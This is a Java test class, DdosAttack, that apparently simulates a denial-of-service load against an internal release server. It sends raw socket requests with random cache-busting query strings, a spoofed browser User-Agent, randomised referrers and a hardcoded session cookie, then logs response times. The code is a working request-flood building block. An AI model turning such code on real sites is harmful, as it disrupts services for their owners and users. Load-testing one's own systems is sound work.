package pageobjects.api;

import org.apache.http.Header;
import org.apache.http.HttpHeaders;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import util.Functions;

import java.io.*;
import java.net.ConnectException;
import java.net.Socket;
import java.net.URI;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Created by philipsushkov on 2017-07-17.
 */

public class DdosAttack {
    private HttpClient client;
    private String URL = "facebookrelease.q4web.release";
    //private String URL = "chicagotest.q4web.com";
    private String PROTOCOL = "http://";
    private int REF_NUM = 5;
    private static final long DEFAULT_PAUSE = 30;

    public void DdosAttackRequest(String sUrl, JSONObject data, FileWriter writer) {

        //To hide warnings logs from execution console.
        Logger logger = Logger.getLogger("");
        logger.setLevel(Level.OFF);

        JSONArray referrals = (JSONArray) data.get("referrals");

        try {
            int statusCode = 0;

            int randNum = Functions.randInt(10, 50);
            Random r = new Random();
            String queryQ4 = "";
            String queryR = "";
            final String alphabetQ4 = "                                                       0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+{_[=-&*#~+:;`]|}!@^";
            //final String alphabetQ4 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            final String alphabetR = "+++++++++++++++++++++++++++++++++++++++++++++++++++++++0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+{_[=-~+`]|}^";
            final int Nq4 = alphabetR.length();
            final int Nr = alphabetR.length();
            long result = 0;

            for (int i=0; i<randNum; i++) {
                queryQ4 = queryQ4 + alphabetR.charAt(r.nextInt(Nq4));
                queryR = queryR + alphabetR.charAt(r.nextInt(Nr));
            }

            String sReferralSite = referrals.get(r.nextInt(REF_NUM)).toString();
            String sReferralUrl = sReferralSite + sUrl + queryR;
            //System.out.println(sReferralUrl);

            String queryEncoded = URLEncoder.encode(queryQ4, "UTF-8");
            //System.out.println(URLEncoder.encode(queryQ4, "UTF-8"));
            String fullURL = PROTOCOL+URL+"/?"+queryQ4;
            System.out.println(fullURL);


            Thread.sleep(DEFAULT_PAUSE);

            try {
                Socket socket = new Socket(URL, 80);

                PrintWriter request = new PrintWriter(socket.getOutputStream());
                request.print("GET " + "/?" + queryQ4 + "/ HTTP/1.1\r\n" +
                        "Host: " + URL + "\r\n" +
                        "Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\r\n" +
                        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n" +
                        "Accept-Language: en-US,en;q=0.8,ru;q=0.6\r\n" +
                        "Cookie: __unam=8c5bdf9-1580728caca-14a17300-70; ASP.NET_SessionId=0puw3swnsinu3jojxdo55b25; facebookrelease.q4web.release_Q4_ASPX_PUBLIC_LanguageId=1; _gat=1; _ga=GA1.2.1148342226.1477588633; _gid=GA1.2.453586935.1500321226\r\n" +
                        "Referer: " + sReferralUrl + "\r\n" +
                        "Connection: keep-alive\r\n\r\n");

                long start = System.currentTimeMillis();
                request.flush();

                InputStream inStream = socket.getInputStream();

                BufferedReader rd = new BufferedReader(new InputStreamReader(inStream));
                String line;
                line = rd.readLine();
                System.out.println(line);
                line = rd.readLine();
                System.out.println(line);
                line = rd.readLine();
                System.out.println(line);
                line = rd.readLine();
                System.out.println(line);
                line = rd.readLine();
                System.out.println(line);
                line = rd.readLine();
                System.out.println(line);
                while ((line = rd.readLine()) != null) {
                    //System.out.println(line);
                    if (line.contains("HTTP/1.1 404 Not Found")) {
                        statusCode = 404;
                    } else if (line.contains("HTTP/1.1 400 Bad Request")) {
                        statusCode = 400;
                    }
                }
                rd.close();
                long end = System.currentTimeMillis();
                result = end - start;
                socket.close();
                System.out.println("Round trip response time = " + result + " millis");

            } catch (ConnectException e) {
                result = 1200;
                statusCode = 0;
                e.printStackTrace();
            }

            /*
            HttpGet request = new HttpGet(fullURL);

            request.setHeader(HttpHeaders.HOST, URL);
            request.setHeader(HttpHeaders.CONTENT_TYPE, "text/html; charset=utf-8");
            request.setHeader(HttpHeaders.CONNECTION, "keep-alive");
            request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
            request.setHeader(HttpHeaders.REFERER, sUrl);

            BasicCookieStore cookieStore = new BasicCookieStore();
            BasicClientCookie cookieSessionId = new BasicClientCookie("ASP.NET_SessionId", "0puw3swnsinu3jojxdo55b25");
            cookieSessionId.setDomain("facebookrelease.q4web.release");
            cookieSessionId.setPath("/");
            cookieSessionId.setAttribute("HTTP", "true");
            cookieStore.addCookie(cookieSessionId);

            //client = HttpClientBuilder.create().setDefaultCookieStore(cookieStore).build();
            client = HttpClientBuilder.create().build();

            HttpContext localContext = new BasicHttpContext();
            localContext.setAttribute(HttpClientContext.COOKIE_STORE, cookieStore);

            long start = System.currentTimeMillis();
            HttpResponse response = client.execute(request, localContext);
            long end = System.currentTimeMillis();
            long result = end-start;
            System.out.println("Round trip response time = " + result + " millis");

            int statusCode = response.getStatusLine().getStatusCode();

            System.out.println(fullURL+": "+statusCode);
            */

            /*
            Header[] headers = response.getAllHeaders();
            for (Header header : headers) {
                System.out.println("Key : " + header.getName()
                        + " ,Value : " + header.getValue());
            }
            System.out.println("\n Done");
            */

            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            Date today = Calendar.getInstance().getTime();
            String recordDate = df.format(today);

            try
            {
                writer.append(fullURL);
                writer.append(',');
                writer.append(Long.toString(result));
                writer.append(',');
                writer.append(sReferralUrl);
                writer.append(',');
                writer.append(Long.toString(statusCode));
                writer.append(',');
                writer.append(recordDate);
                writer.append('\n');
            }
            catch(IOException e)
            {
                e.printStackTrace();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
